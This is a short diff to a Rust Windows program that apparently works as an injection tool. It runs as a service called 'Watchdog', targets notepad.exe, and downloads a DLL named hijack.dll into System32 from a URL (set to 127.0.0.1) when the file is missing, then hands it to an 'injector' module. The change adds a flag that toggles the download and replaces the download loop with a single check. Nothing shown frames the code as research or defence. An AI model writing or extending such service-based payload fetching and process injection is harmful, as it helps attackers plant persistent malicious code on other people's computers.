@@ -35,9 +35,10 @@ use windows::{
 
 mod injector;
 
+const SERVICE_NAME : &str = "Watchdog";
 const PROCESS_NAME : &str = "notepad.exe";
 const DLL_PATH : &str = "C:\\Windows\\System32\\hijack.dll";
-const SERVICE_NAME : &str = "Watchdog";
+const ATTEMPT_DOWNLOAD : bool = true;
 const DOWNLOAD_URL : &str = "http://127.0.0.1";
 
 fn find_process_id(process_name : &str) -> Result<u32, Box<dyn Error>> {
@@ -163,7 +164,7 @@ fn service_main(_args: Vec<OsString>) -> Result<(), Box<dyn Error>> {
     
     while shutdown_rx.try_recv().is_err() {
 
-        while !Path::new(DLL_PATH).is_file() {
+        if ATTEMPT_DOWNLOAD && !Path::new(DLL_PATH).is_file() {
             let _ = download_file(DOWNLOAD_URL, DLL_PATH);
         }
 
